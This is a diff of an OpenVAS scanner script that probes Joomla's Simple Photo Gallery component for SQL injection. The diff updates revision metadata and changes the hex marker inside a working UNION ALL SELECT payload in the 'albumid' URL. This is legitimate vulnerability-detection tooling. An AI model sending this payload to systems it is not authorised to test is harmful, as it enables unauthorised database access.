@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_simple_photo_gallery_sql_inj_03_15.nasl 11323 2018-09-11 10:20:18Z ckuersteiner $
+# $Id: gb_joomla_simple_photo_gallery_sql_inj_03_15.nasl 11449 2018-09-18 10:04:42Z mmartin $
 #
 # Joomla! 'Simple Photo Gallery' Component 'albumid' Parameter SQL Injection Vulnerability
 #
@@ -32,7 +32,7 @@ if (description)
   script_oid("1.3.6.1.4.1.25623.1.0.105243");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11323 $");
+  script_version("$Revision: 11449 $");
 
   script_name("Joomla! 'Simple Photo Gallery' Component 'albumid' Parameter SQL Injection Vulnerability");
 
@@ -56,7 +56,7 @@ because it fails to sufficiently sanitize user-supplied data before using it in 
 
   script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:20:18 +0200 (Tue, 11 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-24 13:13:33 +0100 (Tue, 24 Mar 2015)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -77,9 +77,9 @@ if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
-url = dir + '/index.php?option=com_simplephotogallery&view=images&albumid=1%20UNION%20ALL%20SELECT%20NULL,NULL,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--';
+url = dir + '/index.php?option=com_simplephotogallery&view=images&albumid=1%20UNION%20ALL%20SELECT%20NULL,NULL,0x53514c2d496e6a656374696f6e2d54657374,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--';
 
-if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) )
+if( http_vuln_check( port:port, url:url, pattern:"SQL-Injection-Test" ) )
 {
   report = report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
